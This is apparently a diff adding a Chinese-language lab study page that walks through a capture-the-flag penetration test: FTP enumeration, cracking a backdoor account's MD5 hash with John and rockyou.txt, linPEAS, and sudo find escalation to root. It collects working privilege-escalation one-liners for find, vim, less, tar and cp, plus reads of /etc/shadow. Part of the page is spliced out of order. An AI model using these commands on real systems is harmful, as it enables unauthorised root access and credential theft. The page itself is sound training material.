+                        ✅ 230 Login successful.
+                    </div>
+                </div>
+                
+                <h3>FTP 重要命令</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>命令</th>
+                            <th>功能</th>
+                            <th>說明</th>
+                        </tr>
+                        <tr>
+                            <td>system</td>
+                            <td>系統類型</td>
+                            <td>UNIX Type: L8 (8位元組)</td>
+                        </tr>
+                        <tr>
+                            <td>pwd</td>
+                            <td>當前目錄</td>
+                            <td>Remote directory: /</td>
+                        </tr>
+                        <tr>
+                            <td>ls / ls -al</td>
+                            <td>列出目錄</td>
+                            <td>詳細列表含權限</td>
+                        </tr>
+                        <tr>
+                            <td>cd 目錄</td>
+                            <td>改變目錄</td>
+                            <td>cd /etc</td>
+                        </tr>
+                        <tr>
+                            <td>get 檔案</td>
+                            <td>下載檔案</td>
+                            <td>get /etc/passwd</td>
+                        </tr>
+                        <tr>
+                            <td>features</td>
+                            <td>支援功能</td>
+                            <td>查看 FTP 擴展</td>
+                        </tr>
+                        <tr>
+                            <td>status</td>
+                            <td>連線狀態</td>
+                            <td>檢查目前設定</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h3>關鍵信息蒐集</h3>
+                
+                <h4>查看使用者列表</h4>
+                <div class="command-box"><code>ftp> more /etc/passwd</code></div>
+                <div class="concept-box">
+                    <strong>重要發現：</strong><br>
+                    • <code>ftpuser:x:1000:1000</code> - 一般使用者<br>
+                    • <code>backdoor:$1$R0.YkPaK$rJbjYxLqw5P7dVSMz9rjG1:1000:1000</code> - <span class="highlight">後門帳號！</span><br>
+                    • <code>$1$</code> = MD5 加密格式 (MD5Crypt)
+                </div>
+                
+                <h3>FTP 工作模式</h3>
+                <div class="mermaid">
+                    graph LR
+                        A["主動模式<br/>Active Mode"]
+                        B["被動模式<br/>Passive Mode"]
+                        C["PORT命令<br/>伺服器<br/>連到客戶端"]
+
+        <section id="resources">
+            <h2>📚 線上資源參考</h2>
+            <p>課程中提到的重要網站及其核心內容摘要</p>
+
+            <div class="tool-card">
+                <h3>🔗 GTFOBins - Unix 二進位提權資料庫</h3>
+                <p><strong>網址：</strong> https://gtfobins.github.io</p>
+                <p><strong>簡介：</strong> 包含 Unix 二進位檔案的濫用技巧彙整，幫助安全研究人員了解如何利用這些二進位檔案進行本地提權</p>
+                <p><strong>核心功能：</strong></p>
+                <ul>
+                    <li>搜尋 500+ 個 Unix/Linux 常見命令</li>
+                    <li>針對每個工具提供 6 種提權方式：
+                        <ul>
+                            <li><strong>SUID</strong> - 設置 SUID 位元的二進位檔案</li>
+                            <li><strong>Sudo</strong> - 可用 sudo 執行的二進位</li>
+                            <li><strong>Capabilities</strong> - 具有特殊能力的二進位</li>
+                            <li><strong>File Read/Write</strong> - 檔案讀寫漏洞</li>
+                            <li><strong>Reverse Shell</strong> - 反向殼層技巧</li>
+                            <li><strong>Limited SUID</strong> - 受限 SUID 繞過方法</li>
+                        </ul>
+                    </li>
+                    <li>實時更新，由社群維護（Emilio Pinna 和 Andrea Cardaci 創建）</li>
+                </ul>
+                <p><strong>實戰應用：</strong></p>
+                <div class="command-box">
+# 發現 find 有 SUID 位元
+find / -perm -4000 2>/dev/null | grep find
+
+# 在 GTFOBins 查詢
+https://gtfobins.github.io/gtfobins/find/
+
+# 執行提權命令
+sudo find . -exec /bin/sh \; -quit
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 HackTricks - 駭客技巧完整指南</h3>
+                <p><strong>主網址：</strong> https://book.hacktricks.wiki | <strong>培訓：</strong> https://training.hacktricks.xyz</p>
+                <p><strong>簡介：</strong> 全面的滲透測試和權限提升技巧集合，涵蓋 Linux、Windows、雲端安全等多個領域</p>
+                <p><strong>關鍵章節（與本課程相關）：</strong></p>
+                <ul>
+                    <li><strong>Linux Privilege Escalation Checklist</strong>
+                        <ul>
+                            <li>完整的提權檢查項目清單</li>
+                            <li>涵蓋 SUID、Sudo、Capabilities、Cron、內核漏洞等</li>
+                            <li>URL: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html</li>
+                        </ul>
+                    </li>
+                    <li><strong>Special Permissions</strong> - SUID/SGID/Sticky Bit 詳解</li>
+                    <li><strong>Capabilities Abuse</strong> - Linux Capabilities 濫用</li>
+                    <li><strong>Docker Breakout</strong> - 容器逃逸技巧</li>
+                    <li><strong>Kernel Exploits</strong> - 內核漏洞利用</li>
+                    <li><strong>Services & Cron Jobs</strong> - 服務和定時任務提權</li>
+                </ul>
+                <p><strong>與 linPEAS 的配合使用：</strong></p>
+                <div class="concept-box">
+1. 執行 linPEAS 掃描，標記出紅色危險項目
+2. 在 HackTricks 中查詢相應技巧
+3. 使用 GTFOBins 驗證二進位檔案的提權方法
+4. 在實驗環境中驗證並執行提權操作
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 Nmap 官方文件</h3>
+                <p><strong>主網址：</strong> https://nmap.org | <strong>NSE 文件：</strong> https://nmap.org/nsedoc/</p>
+                <p><strong>重要內容：</strong></p>
+                <ul>
+                    <li><strong>NSE 腳本分類（14 類）：</strong>
+                        <ul>
+                            <li><code>default</code> - 預設執行（-sC）</li>
+                            <li><code>vuln</code> - 漏洞檢測</li>
+                            <li><code>exploit</code> - 漏洞利用</li>
+                            <li><code>brute</code> - 暴力破解</li>
+                            <li><code>auth</code> - 認證繞過</li>
+                            <li><code>version</code> - 版本檢測</li>
+                            <li><code>discovery</code> - 資訊蒐集</li>
+                            <li><code>safe</code> - 安全操作</li>
+                            <li><code>intrusive</code> - 侵入性操作（謹慎使用）</li>
+                        </ul>
+                    </li>
+                    <li><strong>NSE 文件入口：</strong> 612 個官方腳本，包含 VSFTPD 後門檢測</li>
+                </ul>
+                <p><strong>本課程使用的 NSE 腳本：</strong></p>
+                <div class="command-box">
+# VSFTPD 2.3.4 後門檢測
+nmap --script ftp-vsftpd-backdoor -p 21 172.30.0.34
+
+# FTP 匿名登入檢測
+nmap --script ftp-anon -p 21 172.30.0.34
+
+# 綜合漏洞掃描
+nmap -sV --script vuln 172.30.0.34
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 Exploit-DB - 漏洞利用資料庫</h3>
+                <p><strong>網址：</strong> https://www.exploit-db.com</p>
+                <p><strong>用途：</strong> 已公開的漏洞利用代碼（Proof of Concept）資料庫</p>
+                <p><strong>本課程相關：</strong></p>
+                <ul>
+                    <li>VSFTPD 2.3.4 後門利用 (CVE-2011-2523)
+                        <ul>
+                            <li>URL: https://www.exploit-db.com/exploits/49757</li>
+                            <li>編號：EDB-ID 49757</li>
+                            <li>支援：Python 自動化、Metasploit、手動利用</li>
+                        </ul>
+                    </li>
+                </ul>
+                <p><strong>查詢方式：</strong> 搜尋 CVE 編號、軟體版本或漏洞描述</p>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 rockyou.txt - 密碼字典下載</h3>
+                <p><strong>GitHub 下載：</strong> https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</p>
+                <p><strong>統計數據：</strong>
+                    <ul>
+                        <li>總計：<strong>14,341,564 個</strong>密碼</li>
+                        <li>來源：2009 年 RockYou 公司資料洩露</li>
+                        <li>特點：2/3 密碼長度 &lt; 6 個字符</li>
+                        <li>最常見前 5 名：
+                            <ol>
+                                <li>123456（290,729 個帳號使用）</li>
+                                <li>12345（79,076 個帳號）</li>
+                                <li>123456789（76,789 個帳號）</li>
+                                <li>password（59,462 個帳號）</li>
+                                <li>iloveyou（49,952 個帳號）</li>
+                            </ol>
+                        </li>
+                    </ul>
+                </p>
+                <p><strong>Kali Linux 預設位置：</strong></p>
+                <div class="command-box">
+# 檢查是否已安裝
+ls -lh /usr/share/wordlists/rockyou.txt.gz
+
+# 解壓縮
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# 或使用 zcat 直接讀取
+zcat /usr/share/wordlists/rockyou.txt.gz | head -100
+                </div>
+                <p><strong>使用方式：</strong> John the Ripper、Hashcat 等密碼破解工具的字典來源</p>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 John the Ripper 官方文件</h3>
+                <p><strong>官網：</strong> https://www.openwall.com/john | <strong>文件：</strong> https://www.openwall.com/john/doc/</p>
+                <p><strong>重要資源：</strong></p>
+                <ul>
+                    <li><strong>EXAMPLES.shtml</strong> - 使用案例詳解
+                        <ul>
+                            <li>unshadow 合併 passwd 和 shadow</li>
+                            <li>字典、單一、增量三種破解模式</li>
+                            <li>自訂規則和字符集</li>
+                        </ul>
+                    </li>
+                    <li><strong>MODES</strong> - 破解模式詳細說明</li>
+                    <li><strong>RULES</strong - 規則語法</li>
+                    <li><strong>CONFIG</strong - 設定檔配置</li>
+                </ul>
+                <p><strong>破解模式對比：</strong></p>
+                <table>
+                    <tr>
+                        <th>模式</th>
+                        <th>速度</th>
+                        <th>成功率</th>
+                        <th>使用場景</th>
+                    </tr>
+                    <tr>
+                        <td>Wordlist（字典）</td>
+                        <td>⚡⚡⚡ 快</td>
+                        <td>❌ 低（依賴詞表）</td>
+                        <td>弱密碼、常見密碼</td>
+                    </tr>
+                    <tr>
+                        <td>Single Crack（單一）</td>
+                        <td>⚡⚡ 中快</td>
+                        <td>⚠️ 中（利用用戶名）</td>
+                        <td>用戶名衍生密碼</td>
+                    </tr>
+                    <tr>
+                        <td>Incremental（增量）</td>
+                        <td>🐢 超慢</td>
+                        <td>✅ 高（保證破解）</td>
+                        <td>未知密碼、複雜密碼</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="tool-card">
+                <h3>🔗 linPEAS 專案</h3>
+                <p><strong>GitHub：</strong> https://github.com/peass-ng/PEASS-ng</p>
+                <p><strong>說明：</strong> linPEAS 是一個自動化腳本，搜尋可能的 Linux/Unix 主機權限提升路徑</p>
+                <p><strong>檢查項目（輸出紅色標記的危險項）：</strong></p>
+                <ul>
+                    <li>SUID 和 SGID 設置的二進位</li>
+                    <li>sudo 權限配置</li>
+                    <li>Linux Capabilities 濫用</li>
+                    <li>Cron 定時任務</li>
+                    <li>可寫的系統檔案（/etc/passwd, /etc/shadow）</li>
+                    <li>容易遭受漏洞利用的內核版本</li>
+                    <li>開放的文件描述符和通訊端</li>
+                    <li>暫存檔案中的凭證</li>
+                </ul>
+                <p><strong>色彩編碼：</strong></p>
+                <div class="success-box">
+🟢 綠色 = 資訊性，通常安全<br>
+🟡 黃色 = 警告，需要調查<br>
+🔴 紅色 = 危險！可能的提權向量
+                </div>
+                <p><strong>與 HackTricks 的整合流程：</strong></p>
+                <div class="concept-box">
+1. linPEAS 掃描 → 識別紅色危險項目
+2. HackTricks 研究 → 查詢提權技巧
+3. GTFOBins 驗證 → 確認二進位檔案方法
+4. 實驗執行 → 驗證提權操作
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h4>⚠️ 重要提醒</h4>
+                <p>所有提到的工具和技巧<strong>僅用於授權的安全測試</strong>。在他人系統上未經許可進行滲透測試是違法的。</p>
+            </div>
+        </section>
+
+                        D["PASV命令<br/>客戶端<br/>連到伺服器"]
+                        
+                        A --> C
+                        B --> D
+                        
+                        style A fill:#f39c12
+                        style B fill:#27ae60
+                </div>
+            </section>
+            
+            <!-- 密碼破解 -->
+            <section id="cracking">
+                <h2>🔐 密碼破解 (John the Ripper)</h2>
+                
+                <h3>密碼破解流程</h3>
+                <div class="mermaid">
+                    graph TD
+                        A["提取密碼雜湊<br/>from /etc/passwd"]
+                        B["準備密碼字典<br/>rockyou.txt"]
+                        C["使用 John<br/>進行破解"]
+                        D["比對雜湊值"]
+                        E["找到明文密碼<br/>letmein"]
+                        F["驗證登入"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        D --> E
+                        E --> F
+                        
+                        style E fill:#27ae60,color:#fff
+                        style F fill:#27ae60,color:#fff
+                </div>
+                
+                <h3>John the Ripper 介紹</h3>
+                <div class="tool-card">
+                    <h4><span class="tool-name">👨‍🔧 John the Ripper</span></h4>
+                    <p><strong>用途：</strong> 密碼破解工具</p>
+                    <p><strong>支援格式：</strong> DES, MD5, Blowfish, Kerberos 等</p>
+                    <p><strong>工作原理：</strong> 字典攻擊、暴力破解</p>
+                </div>
+                
+                <h3>破解步驟</h3>
+                
+                <h4>步驟 1：提取雜湊</h4>
+                <div class="step">
+                    <strong>從 /etc/passwd 複製後門帳號的密碼雜湊</strong>
+                    <div class="command-box"><code>backdoor:$1$R0.YkPaK$rJbjYxLqw5P7dVSMz9rjG1</code></div>
+                    <div class="command-box"><code>echo 'backdoor:$1$R0.YkPaK$rJbjYxLqw5P7dVSMz9rjG1' > passwd.hash</code></div>
+                </div>
+                
+                <h4>步驟 2：下載密碼字典</h4>
+                <div class="step">
+                    <div class="command-box"><code>wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></div>
+                    <div class="note">rockyou.txt：包含 1400+ 萬個常見密碼的字典檔</div>
+                </div>
+                
+                <h4>步驟 3：使用 John 破解</h4>
+                <div class="step">
+                    <div class="command-box"><code>john --wordlist=rockyou.txt passwd.hash</code></div>
+                    <div class="concept-box">
+                        <strong>參數說明：</strong><br>
+                        • <code>--wordlist=</code> 指定字典檔<br>
+                        • John 會自動檢測雜湊類型（MD5Crypt）<br>
+                        • 多執行緒加速破解
+                    </div>
+                </div>
+                
+                <h4>步驟 4：查看破解結果</h4>
+                <div class="step">
+                    <div class="command-box"><code>john --show passwd.hash</code></div>
+                    <div class="success-box">
+                        <strong>輸出：</strong><br>
+                        backdoor:letmein<br>
+                        1 password hash cracked
+                    </div>
+                </div>
+                
+                <h3>密碼雜湊格式</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>格式</th>
+                            <th>符號</th>
+                            <th>特點</th>
+                        </tr>
+                        <tr>
+                            <td>MD5Crypt</td>
+                            <td>$1$</td>
+                            <td>常用於 Linux，弱點：速度快</td>
+                        </tr>
+                        <tr>
+                            <td>bcrypt</td>
+                            <td>$2a$, $2b$</td>
+                            <td>強大，故意放慢速度</td>
+                        </tr>
+                        <tr>
+                            <td>SHA-512</td>
+                            <td>$6$</td>
+                            <td>現代 Linux 標準</td>
+                        </tr>
+                        <tr>
+                            <td>DES</td>
+                            <td>無</td>
+                            <td>已過時，不安全</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h3>破解結果驗證</h3>
+                <div class="step">
+                    <strong>使用破解的密碼登入目標</strong>
+                    <div class="command-box"><code>ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c3a1a2a0a8a7acacb183f2f4f1edf0f3edf3edf0f7">[email&#160;protected]</a></code></div>
+                    <div class="note">密碼：letmein</div>
+                </div>
+            </section>
+            
+            <!-- 權限提升 -->
+            <section id="privilege">
+                <h2>🚀 權限提升 (Privilege Escalation)</h2>
+                
+                <h3>權限提升概念</h3>
+                <div class="concept-box">
+                    <strong>權限提升（Privilege Escalation）：</strong> 從低權限帳號（如 ftpuser）升級到高權限（如 root）<br>
+                    <strong>目標：</strong> 完全控制系統
+                </div>
+                
+                <h3>權限提升流程圖</h3>
+                <div class="mermaid">
+                    graph TD
+                        A["以低權限帳號登入<br/>uid=1000 ftpuser"]
+                        B["掃描系統漏洞<br/>使用 linPEAS"]
+                        C["分析檢測結果<br/>尋找 NOPASSWD"]
+                        D["發現 sudo find<br/>可不輸密碼執行"]
+                        E["查詢 GTFOBins"]
+                        F["使用 find 提權<br/>sudo find . -exec /bin/sh"]
+                        G["成為 Root<br/>uid=0 root"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        D --> E
+                        E --> F
+                        F --> G
+                        
+                        style A fill:#f39c12
+                        style G fill:#27ae60,color:#fff
+                </div>
+                
+                <h3>步驟 1：安裝提權掃描工具 (linPEAS)</h3>
+                
+                <h4>什麼是 linPEAS？</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">🔍 linPEAS (Linux Privilege Escalation Awesome Script)</span></h4>
+                    <p><strong>功能：</strong> 自動掃描 Linux 系統尋找提權漏洞</p>
+                    <p><strong>檢測項目：</strong></p>
+                    <ul>
+                        <li>SUID/SGID 二進制檔案</li>
+                        <li>sudo 配置（NOPASSWD）</li>
+                        <li>檔案權限漏洞</li>
+                        <li>核心提權漏洞</li>
+                        <li>容器逃脫</li>
+                    </ul>
+                </div>
+                
+                <div class="step">
+                    <strong>下載 linPEAS</strong>
+                    <div class="command-box"><code>wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>給予執行權限</strong>
+                    <div class="command-box"><code>chmod +x linpeas.sh</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>執行並導出結果</strong>
+                    <div class="command-box"><code>./linpeas.sh > l.txt</code></div>
+                    <div class="note">• <code>./</code> 表示執行當前目錄的檔案<br>• <code>></code> 將輸出導向到檔案<br>• <code>l.txt</code> 掃描結果檔案</div>
+                </div>
+                
+                <h3>步驟 2：分析掃描結果</h3>
+                
+                <div class="step">
+                    <strong>查看檢測結果（尋找關鍵字）</strong>
+                    <div class="command-box"><code>cat l.txt | grep NOPASSWD</code></div>
+                    <div class="success-box">
+                        <strong>發現：</strong><br>
+                        User ftpuser may run the following commands without password (NOPASSWD):<br>
+                        /usr/bin/find
+                    </div>
+                    <div class="note">NOPASSWD 意味著可以不輸入密碼直接執行 sudo 命令！</div>
+                </div>
+                
+                <h3>步驟 3：查詢 GTFOBins</h3>
+                
+                <h4>什麼是 GTFOBins？</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">📖 GTFOBins (Go To Failed Open Bins)</span></h4>
+                    <p><strong>網站：</strong> https://gtfobins.github.io/</p>
+                    <p><strong>功能：</strong> 收集可用於提權的 Unix 二進制檔案</p>
+                    <p><strong>用途：</strong> 查詢如何濫用各種工具進行提權</p>
+                </div>
+                
+                <div class="step">
+                    <strong>訪問 GTFOBins 查詢 find 提權方法</strong>
+                    <div class="command-box"><code>https://gtfobins.github.io/gtfobins/find/</code></div>
+                    <div class="concept-box">
+                        <strong>找到的提權命令：</strong><br>
+                        <code>sudo find . -exec /bin/sh \; -quit</code>
+                    </div>
+                </div>
+                
+                <h3>步驟 4：執行提權命令</h3>
+                
+                <div class="step">
+                    <strong>檢查目前身份</strong>
+                    <div class="command-box"><code>id</code></div>
+                    <div class="note">uid=1000(ftpuser) gid=1000(ftpuser)</div>
+                </div>
+                
+                <div class="step">
+                    <strong>執行 find 提權</strong>
+                    <div class="command-box"><code>sudo find . -exec /bin/sh \; -quit</code></div>
+                    <div class="note">• <code>find .</code> 在當前目錄尋找檔案<br>• <code>-exec /bin/sh</code> 執行 shell<br>• <code>-quit</code> 找到第一個後立即結束</div>
+                </div>
+                
+                <div class="step">
+                    <strong>驗證成為 Root</strong>
+                    <div class="command-box"><code># id
+uid=0(root) gid=0(root) groups=0(root)</code></div>
+                    <div class="success-box">
+                        ✅ 成功提升為 Root！
+                    </div>
+                </div>
+                
+                <h3>步驟 5：獲取 Flag</h3>
+                
+                <div class="step">
+                    <strong>進入 Root 目錄</strong>
+                    <div class="command-box"><code># cd /root
+# ls
+proof.txt</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>讀取 Flag</strong>
+                    <div class="command-box"><code># cat proof.txt
+kiwis{DD76665D6F7BE968F6A4U911BE49BCC1B}</code></div>
+                    <div class="success-box">
+                        ✅ 完成全部滲透流程！
+                    </div>
+                </div>
+                
+                <h3>常見提權方法對比</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>方法</th>
+                            <th>難度</th>
+                            <th>說明</th>
+                        </tr>
+                        <tr>
+                            <td>SUID 濫用</td>
+                            <td>⭐⭐</td>
+                            <td>利用設置了 SUID 位的二進制檔案</td>
+                        </tr>
+                        <tr>
+                            <td>Sudo 配置誤設</td>
+                            <td>⭐</td>
+                            <td>NOPASSWD 或不合理的權限配置</td>
+                        </tr>
+                        <tr>
+                            <td>核心漏洞</td>
+                            <td>⭐⭐⭐</td>
+                            <td>Linux 核心的本地特權升級漏洞</td>
+                        </tr>
+                        <tr>
+                            <td>檔案權限</td>
+                            <td>⭐⭐</td>
+                            <td>可寫的系統檔案或密鑰</td>
+                        </tr>
+                    </table>
+                </div>
+            </section>
+            
+            <!-- 核心工具 -->
+            <section id="tools">
+                <h2>🛠️ 核心工具介紹</h2>
+                
+                <h3>工具概覽</h3>
+                <div class="mermaid">
+                    graph LR
+                        A["滲透<br/>測試"]
+                        B["掃描<br/>Nmap"]
+                        C["利用<br/>Exploit"]
+                        D["破解<br/>John"]
+                        E["提權<br/>linPEAS<br/>GTFOBins"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        D --> E
+                        
+                        style B fill:#3498db
+                        style C fill:#e74c3c
+                        style D fill:#f39c12
+                        style E fill:#27ae60
+                </div>
+                
+                <h3>工具詳解</h3>
+                
+                <h4>1️⃣ Nmap（網路掃描）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">🎯 Nmap - Network Mapper</span></h4>
+                    <p><strong>官網：</strong> https://nmap.org/</p>
+                    <p><strong>核心功能：</strong></p>
+                    <ul>
+                        <li>主機發現</li>
+                        <li>埠口掃描</li>
+                        <li>服務版本檢測</li>
+                        <li>OS 指紋識別</li>
+                        <li>NSE 腳本執行</li>
+                    </ul>
+                    <p><strong>常用參數：</strong><br>
+                    <code>nmap -p- -sV -sC -A 目標IP</code></p>
+                </div>
+                
+                <h4>2️⃣ John the Ripper（密碼破解）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">🔐 John the Ripper</span></h4>
+                    <p><strong>官網：</strong> https://www.openwall.com/john/</p>
+                    <p><strong>核心功能：</strong></p>
+                    <ul>
+                        <li>字典攻擊</li>
+                        <li>暴力破解</li>
+                        <li>規則引擎</li>
+                        <li>多格式支援</li>
+                        <li>GPU 加速</li>
+                    </ul>
+                    <p><strong>常用命令：</strong><br>
+                    <code>john --wordlist=dict.txt hashes.txt</code></p>
+                </div>
+                
+                <h4>3️⃣ linPEAS（權限提升掃描）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">🔍 linPEAS</span></h4>
+                    <p><strong>GitHub：</strong> https://github.com/peass-ng/PEASS-ng</p>
+                    <p><strong>核心功能：</strong></p>
+                    <ul>
+                        <li>自動化漏洞掃描</li>
+                        <li>配置誤設檢測</li>
+                        <li>彩色高亮關鍵信息</li>
+                        <li>支援容器環境</li>
+                    </ul>
+                    <p><strong>執行方式：</strong><br>
+                    <code>./linpeas.sh 2>/dev/null | tee output.txt</code></p>
+                </div>
+                
+                <h4>4️⃣ GTFOBins（提權參考）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">📖 GTFOBins</span></h4>
+                    <p><strong>官網：</strong> https://gtfobins.github.io/</p>
+                    <p><strong>核心功能：</strong></p>
+                    <ul>
+                        <li>搜集提權技巧</li>
+                        <li>工具濫用案例</li>
+                        <li>實際命令範例</li>
+                    </ul>
+                    <p><strong>使用流程：</strong> 發現可利用工具 → 訪問 GTFOBins → 複製提權命令</p>
+                </div>
+                
+                <h4>5️⃣ netcat（多功能連線工具）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">🔌 netcat (nc)</span></h4>
+                    <p><strong>別稱：</strong> 網路工程師的瑞士刀</p>
+                    <p><strong>核心功能：</strong></p>
+                    <ul>
+                        <li>TCP/UDP 連線</li>
+                        <li>埠口掃描</li>
+                        <li>檔案傳輸</li>
+                        <li>Reverse Shell</li>
+                    </ul>
+                    <p><strong>常用命令：</strong><br>
+                    <code>nc 目標IP 埠口</code></p>
+                </div>
+                
+                <h4>6️⃣ curl（檔案下載）</h4>
+                <div class="tool-card">
+                    <h4><span class="tool-name">📥 curl</span></h4>
+                    <p><strong>功能：</strong> 從網路下載檔案</p>
+                    <p><strong>常用參數：</strong></p>
+                    <ul>
+                        <li><code>-O</code> 使用原檔案名下載</li>
+                        <li><code>-o</code> 指定輸出檔案名</li>
+                        <li><code>-L</code> 跟隨重定向</li>
+                    </ul>
+                    <p><strong>範例：</strong><br>
+                    <code>curl -O https://example.com/file.sh</code></p>
+                </div>
+            </section>
+            
+            <!-- 實戰技巧 -->
+            <section id="tips">
+                <h2>💡 實戰技巧與筆記</h2>
+                
+                <h3>Linux 權限速查表</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>權限位</th>
+                            <th>數值</th>
+                            <th>二進制</th>
+                            <th>說明</th>
+                        </tr>
+                        <tr>
+                            <td>r (read)</td>
+                            <td>4</td>
+                            <td>100</td>
+                            <td>讀取內容</td>
+                        </tr>
+                        <tr>
+                            <td>w (write)</td>
+                            <td>2</td>
+                            <td>010</td>
+                            <td>修改/刪除</td>
+                        </tr>
+                        <tr>
+                            <td>x (execute)</td>
+                            <td>1</td>
+                            <td>001</td>
+                            <td>執行/進入</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h3>密碼破解實戰技巧</h3>
+                <div class="concept-box">
+                    <h4>🔓 John the Ripper 進階用法</h4>
+                    <strong>1. 三階段自動攻擊（推薦）：</strong>
+                    <div class="command-box">
+# 依序嘗試：single crack → wordlist → incremental
+john --wordlist=rockyou.txt --rules hashes.txt
+                    </div>
+                    <strong>2. 只破解特定帳號：</strong>
+                    <div class="command-box">
+# 只破解 root 帳號
+john --single --max-run-time=3600 --users=0 hashes.txt
+
+# 只破解特定帳號
+john --wordlist=rockyou.txt --users=username hashes.txt
+                    </div>
+                    <strong>3. 使用自訂規則加強字典：</strong>
+                    <div class="command-box">
+# 應用規則變異（如添加數字、大寫等）
+john --wordlist=rockyou.txt --rules=Jumbo hashes.txt
+
+# 常見規則變異：
+# l - 轉小寫 | u - 轉大寫 | c - 首字母大寫
+# r - 反轉 | d - 複製 | a - 添加字符
+                    </div>
+                    <strong>4. 檢查之前破解過的密碼：</strong>
+                    <div class="command-box">
+# 顯示已破解的密碼
+john --show hashes.txt
+
+# 只顯示未破解的
+john --show=left hashes.txt
+                    </div>
+                    <strong>5. 中斷和恢復破解：</strong>
+                    <div class="command-box">
+# 中斷：按 Ctrl+C
+# 恢復：使用 --restore 旗標
+john --restore
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ 密碼破解注意事項</h4>
+                    <ul>
+                        <li><strong>rockyou.txt 局限性：</strong> 只適合弱密碼，無法破解複雜密碼</li>
+                        <li><strong>計算資源：</strong> incremental 模式非常耗時，可能需要數天</li>
+                        <li><strong>格式檢測：</strong> John 通常能自動檢測雜湊類型，但複雜格式需手動指定 --format</li>
+                        <li><strong>並行破解：</strong> 使用 --fork 參數利用多核：<code>john --fork=4 hashes.txt</code></li>
+                    </ul>
+                </div>
+
+                <h3>權限提升實戰技巧</h3>
+                <div class="concept-box">
+                    <h4>📈 5 步權限提升工作流</h4>
+                    <div class="command-box">
+# 步驟 1：運行 linPEAS 掃描
+bash linpeas.sh 2>/dev/null | tee linpeas_output.log
+
+# 步驟 2：查看紅色標記的危險項目
+grep "󰄬" linpeas_output.log  # 或搜尋 "CRITICAL"
+
+# 步驟 3：查詢 GTFOBins
+# 如發現 find 有 SUID，訪問：https://gtfobins.github.io/gtfobins/find/
+
+# 步驟 4：在實驗環境驗證
+sudo find . -exec /bin/sh \; -quit
+
+# 步驟 5：檢驗是否成功提權
+whoami  # 應顯示 root
+id      # 應顯示 uid=0(root)
+                    </div>
+
+                    <h4>SUID 二進位提權頻見方法</h4>
+                    <table>
+                        <tr>
+                            <th>二進位檔案</th>
+                            <th>提權命令</th>
+                            <th>條件</th>
+                        </tr>
+                        <tr>
+                            <td><code>find</code></td>
+                            <td><code>find . -exec /bin/sh \; -quit</code></td>
+                            <td>任何可寫目錄</td>
+                        </tr>
+                        <tr>
+                            <td><code>vim</code></td>
+                            <td><code>vim -c ':!bash'</code></td>
+                            <td>vim 設有 SUID</td>
+                        </tr>
+                        <tr>
+                            <td><code>less</code></td>
+                            <td><code>less /etc/shadow</code> 後輸入 <code>!/bin/sh</code></td>
+                            <td>less 設有 SUID</td>
+                        </tr>
+                        <tr>
+                            <td><code>cat</code></td>
+                            <td><code>cat /etc/shadow</code></td>
+                            <td>cat 設有 SUID，讀取敏感檔案</td>
+                        </tr>
+                        <tr>
+                            <td><code>cp</code></td>
+                            <td><code>cp /bin/bash /tmp/bash && chmod u+s /tmp/bash</code></td>
+                            <td>cp 設有 SUID，複製可執行檔</td>
+                        </tr>
+                        <tr>
+                            <td><code>tar</code></td>
+                            <td><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></td>
+                            <td>tar 設有 SUID</td>
+                        </tr>
+                    </table>
+
+                    <h4>Sudo 權限提權</h4>
+                    <div class="command-box">
+# 檢查 sudo 權限
+sudo -l
+
+# 常見提權場景：
+# 1. sudo 且無密碼要求
+sudo find . -exec /bin/sh \; -quit
+
+# 2. sudo 特定命令（如 vim）
+sudo vim -c ':!bash'
+
+# 3. PATH 注入
+# 如果允許 sudo /usr/bin/script，查看 script 是否使用相對路徑
+# 例：script 內容是 'python myscript.py'
+# 可以在同目錄建立 python -> /bin/bash 的連結
+                    </div>
+                </div>
+
+                <h3>常見權限組合</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>數值</th>
+                            <th>符號</th>
+                            <th>說明</th>
+                        </tr>
+                        <tr>
+                            <td>777</td>
+                            <td>rwxrwxrwx</td>
+                            <td>完全開放（危險！）</td>
+                        </tr>
+                        <tr>
+                            <td>755</td>
+                            <td>rwxr-xr-x</td>
+                            <td>擁有者可寫，其他只讀</td>
+                        </tr>
+                        <tr>
+                            <td>644</td>
+                            <td>rw-r--r--</td>
+                            <td>擁有者可寫，其他只讀</td>
+                        </tr>
+                        <tr>
+                            <td>600</td>
+                            <td>rw-------</td>
